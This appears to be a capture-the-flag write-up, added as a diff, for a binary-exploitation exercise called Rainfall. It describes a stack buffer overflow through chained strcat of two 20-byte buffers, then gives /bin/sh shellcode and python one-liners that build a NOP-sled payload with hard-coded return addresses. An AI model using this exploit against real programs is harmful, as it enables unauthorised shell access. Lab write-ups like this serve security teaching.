@@ -1,0 +1,45 @@
+
+retro-engineered the binary:
+main -> one buffer[20]
+        calls <pp>
+
+pp   -> two buffer[20]
+        calls <p> on both one after the other
+		strcats them then copies the result in <main>buffer
+
+p    -> one buff[4096]
+        reads stdin for 4096 chars then copies 20 of them
+        in <pp>bufferN.
+
+if both <pp>buffers are written at maximum capacity they
+overwrite main's pushed EIP when there concatenation is copied
+to <main>buffer
+
+Because 40 bytes is a bit short for a shellcode and an address
+with a surgical call in a changing stack size between different
+gdb and shell env, we will use the <p>buffer which is way
+bigger and let's us land in a sea of nops.
+
+We can't go too far thought because the closer the stack is to the
+previous stack frame, the higher the chance it gets corrupted by
+subsequent function calls.
+
+Thus:
+print NOPS + SHELLCODE + (FILL to get 4095 chars + \n)
+print OFFSET + SEA_OF_NOPS_ADDRESS + (FILL to get 20 chars)
+
+len = 24
+shcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+"\x90" * 0x200
+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+"\x90" * 0xde7
+"\x90" * 0x9
+"\x20\xe8\xff\xbf"
+"\x90" * 0x7
+
+Kali:
+python -c 'print "\x90"*0x200+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*0xde7;print"\x90"*0xc+"\x70\xc6\xff\xff"+"\x90"*4'
+
+Rainfall:
+python -c 'print "\x90"*0x200+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*0xde7;print"\x90"*0x9+"\x20\xe8\xff\xbf"+"\x90"*0x7'
